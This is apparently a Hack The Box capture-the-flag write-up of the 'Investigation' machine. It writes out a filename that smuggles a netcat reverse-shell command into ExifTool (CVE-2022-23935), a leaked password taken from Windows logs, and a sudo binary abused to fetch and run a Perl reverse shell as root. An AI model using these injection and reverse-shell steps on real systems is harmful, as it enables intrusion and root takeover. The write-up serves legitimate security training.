---
title: "HTB Investigation"
date: 2026-01-08 04:00:00 +1100
categories: [Hack The Box]
tags: [ExifTool, Windows logs, .msg files, Reverse Engineering, pearl ]
image:
  path: /assets/img/Investigation/icon.png

---    

Investigation is a Linux box rated as medium difficulty, which features a web application that provides a service for digital forensic analysis of image files. The server utilizes the ExifTool utility to analyze the image, however, the version being used has a command injection vulnerability that can be exploited to gain an initial foothold on the box as the user www-data. By analyzing logs found in a Windows Event logs file, we can escalate privileges to the user smorton. To achieve the final goal of gaining root access, we must reverse engineer a binary that can be run by the user smorton with sudo access and then exploit it to elevate privileges to root.

# Nmap

```bash
└─$ scan 10.129.228.203         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-08 11:19 AEDT
Nmap scan report for 10.129.228.203
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds

```

# Port 80

![image.png](/assets/img/Investigation/1.png)

The main website looks to be a forensic service of some sort. Let's take a look at the service it provides:

![image.png](/assets/img/Investigation/2.png)

so it looks to me like we can upload an image, and it will do some sort of processing on that image. Lets upload a random image and see what it does:

![image.png](/assets/img/Investigation/3.png)

# CVE-2022-23935

.After uploading the image, we get taken to a different page. The page shows that the web app has performed an exiftool analysis on the file:

![image.png](/assets/img/Investigation/4.png)

The first thing that stands out to me is the version number - 12.37.  After doing some googling i found this CVE for this version of ExifTool https://github.com/cowsecurity/CVE-2022-23935.

Pretty much what happens is that if the filename passed to exiftool ends with a pipe character `|` and exists on the filesystem, then the file will be treated as a pipe and executed as an OS command.

So let's name a file and then upload it :

```shell
'busybox nc 10.10.14.30 4444 -e bash | bash |'
```

![image.png](/assets/img/Investigation/5.png)

And we instantly get a hit back:

```shell
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.228.203] 42706
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

After doing some basic enumeration, i didnt really find anything important or worth while.

Howver i did run crontab.

```shell
ww-data@investigation:~$ crontab -l
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
www-data@investigation:~$ 

```

Although these cron jobs are running as www-data, so no privesc - did does reveal an interesting file and directory. lets go  take a look:

```shell
www-data@investigation:/usr/local/investigation$ ls
'Windows Event Logs for Analysis.msg'   analysed_log
www-data@investigation:/usr/local/investigation$ 

```

The file ‘analysed_log’ turns up as empty; however, the Windows file is quite large. 

```shell
ww-data@investigation:/usr/local/investigation$ ls -la
total 1288
drwxr-xr-x  2 root     root        4096 Sep 30  2022  .
drwxr-xr-x 11 root     root        4096 Aug 27  2022  ..
-rw-rw-r--  1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r--  1 www-data www-data       0 Oct  1  2022  analysed_log
www-data@investigation:/usr/local/investigation$ 

```

Let's transfer the file to our host box for further inspection.

Because .msg files are in Windows format lets convert them to .mbox

```shell
msgconvert Windows\ Event\ Logs\ for\ Analysis.msg --mbox emails.mbox
```

We can then open the file with:

```shell
mutt -f emails.mbox
```

In the program, we see the following email:

![image.png](/assets/img/Investigation/6.png)

So it looks to be an email about some Windows logs, which are attached. Let's press V. If we click enter, we are prompted to download the zip file.

![image.png](/assets/img/Investigation/7.png)

If we click Enter, we are prompted to download the zip file.

lets take a look at the security file.

```shell
└─$ head security.evtx 
ElfFile�-N���蛷ElfChnk^^�0���nYg�4
=��     Nw>��▒e)M\      :�n�t&�V  #     �n
-H�!�~}e�R**y�Ϳ��
                    ��6&��6*�7Q�'��기'IA��=M�
                                            Event�j�xmlns5http://schemas.microsoft.com/win/2004/08/events/event��f�oTSystemA���▒�Provider�F=K�Name▒Microsoft-Windows-Eventlog�)Guid&{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}AM��aEventID')�
Qualifiers
            "N▒   Version
                        wd�Level�E{Task ��Opcode$�jKeywordsA��P;�
                                                                TimeCreated':j<{
SystemTime
EventRecordID

A������
        Correlation\F�
�
ActivityID��5�RelatedActivityIDA��m)��  ExecutionHFN�
eForenzics-DIA��BSecurity>fLUserID��aChanneSecurity��>�;Computer
                                    $e�5UserData!
                                                                                                                    
┌──(kali㉿kali)-[~/boxes/investigation]

```

We can use this tool to make it readable:

```shell
chainsaw dump security.evtx
```

Becuase its really long lets put it into a file.

![image.png](/assets/img/Investigation/8.png)

The output just consists of long windows of logs 

![image.png](/assets/img/Investigation/9.png)

If we grep the output for the user on the box ‘SMORTON’, we see he appears many times. 

```shell
─(kali㉿kali)-[~/boxes/investigation]
└─$ cat output.txt | grep SMorton
        SubjectUserName: SMorton
    SubjectUserName: SMorton
    SubjectUserName: SMorton
    SubjectUserName: SMorton

```

with abit of guessing, as we are close to the user flag im going to guess that there is a password stored somewhere in here. its too long to manually sort through. 

Beacuse its a Windows log file, we can grep for logon codes. 

The failed logon code for Windows is:

```shell
Event ID 4625
```

So lets look for that.

```shell
──(kali㉿kali)-[~/boxes/investigation]
└─$ cat output.txt | grep "EventID: 4625"
    EventID: 4625
    EventID: 4625
    EventID: 4625
                                                                                                                    
```

We can see there are a few failed login attempts.

lets expand them now:

```shell
─$ cat output.txt | grep "EventID: 4625" -A 30
    EventID: 4625
    Version: 0
    Level: 0
    Task: 12544
    Opcode: 0
    Keywords: '0x8010000000000000'
    TimeCreated_attributes:
        SystemTime: 2022-08-01T16:34:51.543729Z
    EventRecordID: 11371170
    Correlation_attributes:
        ActivityID: 6A946884-A5BC-0001-D968-946ABCA5D801
    Execution_attributes:
        ProcessID: 628
        ThreadID: 5128
    Channel: Security
    Computer: eForenzics-DI
    Security: null
    EventData:
    SubjectUserSid: S-1-5-18
    SubjectUserName: EFORENZICS-DI$
    SubjectDomainName: WORKGROUP
    SubjectLogonId: '0x3e7'
    TargetUserSid: S-1-0-0
    TargetUserName: lmonroe
    TargetDomainName: EFORENZICS-DI
    Status: '0xc000006d'
    FailureReason: '%%2313'
    SubStatus: '0xc000006a'
    LogonType: 7
    LogonProcessName: User32
    AuthenticationPackageName: Negotiate
--
    EventID: 4625
    Version: 0
    Level: 0
    Task: 12544
    Opcode: 0
    Keywords: '0x8010000000000000'
    TimeCreated_attributes:
        SystemTime: 2022-08-01T16:50:07.137703Z
    EventRecordID: 11371603
    Correlation_attributes:
        ActivityID: 6A946884-A5BC-0001-D968-946ABCA5D801
    Execution_attributes:
        ProcessID: 628
        ThreadID: 604
    Channel: Security
    Computer: eForenzics-DI
    Security: null
    EventData:
    SubjectUserSid: S-1-5-18
    SubjectUserName: EFORENZICS-DI$
    SubjectDomainName: WORKGROUP
    SubjectLogonId: '0x3e7'
    TargetUserSid: S-1-0-0
    TargetUserName: hmraley
    TargetDomainName: EFORENZICS-DI
    Status: '0xc000006d'
    FailureReason: '%%2313'
    SubStatus: '0xc0000064'
    LogonType: 2
    LogonProcessName: User32
    AuthenticationPackageName: Negotiate
--
    EventID: 4625
    Version: 0
    Level: 0
    Task: 12544
    Opcode: 0
    Keywords: '0x8010000000000000'
    TimeCreated_attributes:
        SystemTime: 2022-08-01T19:15:15.374769Z
    EventRecordID: 11373331
    Correlation_attributes:
        ActivityID: 6A946884-A5BC-0001-D968-946ABCA5D801
    Execution_attributes:
        ProcessID: 628
        ThreadID: 6800
    Channel: Security
    Computer: eForenzics-DI
    Security: null
    EventData:
    SubjectUserSid: S-1-5-18
    SubjectUserName: EFORENZICS-DI$
    SubjectDomainName: WORKGROUP
    SubjectLogonId: '0x3e7'
    TargetUserSid: S-1-0-0
    TargetUserName: Def@ultf0r3nz!csPa$$
    TargetDomainName: ''
    Status: '0xc000006d'
    FailureReason: '%%2313'
    SubStatus: '0xc0000064'
    LogonType: 7
    LogonProcessName: User32
    AuthenticationPackageName: Negotiate
                                            
```

And right at the bottom, we find a password:

```shell
Def@ultf0r3nz!csPa$$
```

lets check for password reuse:

```bash
└─$ ssh smorton@eforenzics.htb 
smorton@eforenzics.htb's password: 
Last login: Thu Jan  8 04:11:56 2026 from 10.10.14.30
smorton@investigation:~$ cat user.txt
ac2dbb8662c3a4100d599a4858bfee57
smorton@investigation:~$ 

```

and we are in. 

# PrivEsc

Doing a quick sudo -l command, we see the following: 

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$ 

```

    running the binary just outputs the message;

```bash
smorton@investigation:~$ sudo /usr/bin/binary
Exiting... 
smorton@investigation:~$ 

```

# Reverse Engineering

i also ran strings on the binary and couldn't really make out any thing use full. Let's load up the binary in Ghidra. 

![image.png](/assets/img/Investigation/10.png)

I'll paste the full code below, and I'll do my best to annotate the parts I understand.

```bash

undefined8 main(int param_1,long param_2)

{
    __uid_t _Var1;
    int iVar2;
    FILE *__stream;
    undefined8 uVar3;
    char *param0;
    char *param0_00;
    
    //exits if there are not two parameters run with the program
    if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */ 
                    // 
    exit(0);
    }
    // program must be running as root
    _Var1 = getuid();
    if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
    }
    
    // compares the second param to the string "lDnxUysaQn" if they dont match then exit 
    iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
    if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
    }
    puts("Running... ");
    
    //opens a file called "lDnxUysaQn"
    __stream = fopen(*(char **)(param_2 + 0x10),"wb");
    
    //creates a curl session opbject
    uVar3 = curl_easy_init();
    
    //on 64-bit Linux: *(param_2 + 8) → argv[1] and *(param_2 + 0x10) → argv[2]
    // CURLOPT_URL = 10002 (decimal) = 0x2712 (hex)
    // so its essentially curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
    // and *(param_2 + 8) = argv[1]
    curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
    
    //curl_easy_setopt(curl, CURLOPT_WRITEDATA, stream); so its writing the curl output to a file 
    curl_easy_setopt(uVar3,0x2711,__stream);
    curl_easy_setopt(uVar3,0x2d,1);
    iVar2 = curl_easy_perform(uVar3);
    
    // if the curl command worked enter the if statment and then it builts the string "perl ./lDnxUysaQn" to be executed
    if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(char **)(param_2 + 0x10));
    param0 = (char *)malloc((long)iVar2 + 1);
    snprintf(param0,(long)iVar2 + 1,"%s",*(char **)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",param0);
    param0_00 = (char *)malloc((long)iVar2 + 1);
    // but 
    snprintf(param0_00,(long)iVar2 + 1,"perl ./%s",param0);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(param0_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
    }
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
}
```

so pretty much what the code is doing on a high-level basis:

1. The program first checks that it is executed with exactly two command-line arguments and that it is running as the root user; if either condition fails, it immediately exits. It then verifies that the second argument matches the hardcoded filename `lDnxUysaQn`, which is used as a safety check before continuing.
2. If all checks pass, the program uses `libcurl` to download content from a URL supplied as the first argument and writes it to a file named `lDnxUysaQn`. Once the download succeeds, it constructs a command to execute the downloaded file using Perl (`perl ./lDnxUysaQn`) and runs it with root privileges via `system()`.
3. After execution, the program cleans up by deleting the downloaded file. In effect, this binary acts as a privileged downloader and executor, allowing arbitrary remote code execution as root if the correct arguments are supplied.

Because its running as root, we can specify our host and make the program fetch a Perl reverse shell. Once it does taht it will automatically execute it and connect back to us. lets use this rev shell https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

lets build the command:

```shell
smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.30/perl-reverse-shell.pl lDnxUysaQn
```

We see that we get a hit for the reverse shell 

```shell
─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.203 - - [08/Jan/2026 15:33:09] "GET /perl-reverse-shell.pl HTTP/1.1" 200 -

```

And we get root 

```shell
──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.228.203] 42158
    04:34:48 up  4:18,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
smorton  pts/1    10.10.14.30      04:11    8.00s  0.02s  0.02s -bash
Linux investigation 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# cat /root/root.txt
36a18c34e5fed4149befc2ff5e9b159b
# 

```